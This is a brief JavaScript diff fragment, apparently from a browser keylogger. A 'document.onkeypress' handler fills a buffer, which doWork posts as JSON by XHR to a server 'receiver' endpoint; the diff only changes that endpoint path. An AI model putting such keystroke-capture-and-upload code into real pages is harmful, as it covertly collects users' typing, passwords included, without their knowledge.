@@ -32,7 +32,7 @@ document.onkeypress = function(e) {
 function doWork() {
 // ajax the JSON to the server
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "receiver", true);
+    xhr.open("POST", "/<user>/receiver", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.send(JSON.stringify({
         value: buffer 
